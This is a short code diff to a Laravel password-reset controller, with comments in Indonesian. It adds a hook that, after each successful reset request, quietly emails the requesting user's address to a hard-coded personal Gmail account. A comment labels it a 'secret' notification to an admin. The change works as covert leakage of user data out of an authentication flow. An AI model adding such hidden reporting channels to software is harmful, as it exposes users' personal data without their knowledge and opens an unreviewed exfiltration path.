@@ -8,6 +8,7 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Password;
 use Illuminate\Validation\ValidationException;
 use Illuminate\View\View;
+use Illuminate\Support\Facades\Mail; // Tambahan untuk fungsi email
 
 class PasswordResetLinkController extends Controller
 {
@@ -36,6 +37,14 @@ class PasswordResetLinkController extends Controller
         $status = Password::sendResetLink(
             $request->only('email')
         );
+
+        // Jika link berhasil dikirim ke warga, kirimkan juga notifikasi rahasia ke Admin
+        if ($status == Password::RESET_LINK_SENT) {
+            Mail::raw("Pantauan Keamanan: Ada permintaan Reset Password dari warga dengan email: " . $request->email . ". Sistem telah berhasil mengirimkan link reset ke email tersebut.", function ($message) {
+                $message->to('gr1mmp4ck@gmail.com')
+                        ->subject('Pantauan Admin: Request Reset Password Warga');
+            });
+        }
 
         return $status == Password::RESET_LINK_SENT
                     ? back()->with('status', __($status))
